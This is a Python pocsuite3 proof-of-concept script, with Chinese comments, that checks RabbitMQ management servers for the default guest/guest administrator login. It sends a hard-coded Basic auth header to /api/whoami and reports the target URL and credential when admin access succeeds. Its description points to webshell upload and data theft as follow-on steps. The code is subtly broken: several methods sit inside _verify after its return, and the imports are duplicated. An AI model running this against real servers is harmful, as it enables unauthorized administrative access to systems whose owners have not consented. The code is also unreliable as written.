"""
作者 charis
时间 2023-1-19
注意 poc使用的是默认账户guest/guest进行测试，没有弱口令探测功能
"""
import time
import re
from pocsuite3.api import Output, POCBase, POC_CATEGORY, register_poc, requests, get_listener_ip, get_listener_port, VUL_TYPE
from pocsuite3.lib.core.enums import OS_ARCH, OS
from pocsuite3.lib.utils import random_str, generate_shellcode_list
from pocsuite3.modules.dnslog import Dnslog
from pocsuite3.modules.encryption import Encryption
from collections import OrderedDict
from pocsuite3.api import Output, POCBase, POC_CATEGORY, register_poc, requests, VUL_TYPE
from pocsuite3.api import OptString


class DemoPOC(POCBase):
    vulID = '10'  # ssvid
    version = '1.0'
    author = ['charis']
    vulDate = '未知'
    createDate = '2023-01-19'
    updateDate = '2023-01-19'
    references = ['https://blog.csdn.net/qq_35958788/article/details/92964579']
    name = 'RabbitMQ 默认用户未授权访问漏洞'
    appPowerLink = 'https://www.rabbitmq.com/'
    appName = 'RabbitMQ'
    appVersion = 'RabbitMQ version all'
    vulType = VUL_TYPE.UNAUTHORIZED_ACCESS
    desc = '''RabbitMQ是目前非常热门的一款消息中间件，基于AMQP协议的，可以在发布者和使用者之间交换异步消息。由于网站用户帐号存在弱口令，导致攻击者通过弱口令可轻松登录到网站中，从而进行下一步的攻击，如上传webshell，获取敏感数据。另外攻击者利用弱口令登录网站管理后台，可执行任意管理员的操作'''
    samples = []
    category = POC_CATEGORY.EXPLOITS.WEBAPP

    # 定义检查方法
    def _check(self, url):

        payloads = [
            r"/api/whoami",
        ]

        flag = '{"name":"guest","tags":["administrator"]}'

        for payload in payloads:
            vul_url = url + payload

            headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0",
                "Accept": "*/*",
                "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
                "Accept-Encoding": "gzip, deflate",
                "content-type": "application/json",
                "authorization": "Basic Z3Vlc3Q6Z3Vlc3Q=",
                "Connection": "close"
            }
            try:
                r = requests.get(vul_url, headers=headers)
                if r.status_code == 200:
                    if flag in r.text:
                        return url, "guest:guest"
            except requests.exceptions.RequestException as e:
                pass
        return False

    def _verify(self):

        result = {}
        p = self._check(self.url)
        if p:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = p[0]
            result['VerifyInfo']['account'] = p[1]
        return self.parse_output(result)

        def _attack(self):
            exit("无需获取shell")

        def _shell(self):
            exit("无需获取shell")

        def parse_output(self, result):
            output = Output(self)
            if result:
                output.success(result)
            else:
                output.fail('target is not vulnerable')
            return output

register_poc(DemoPOC)


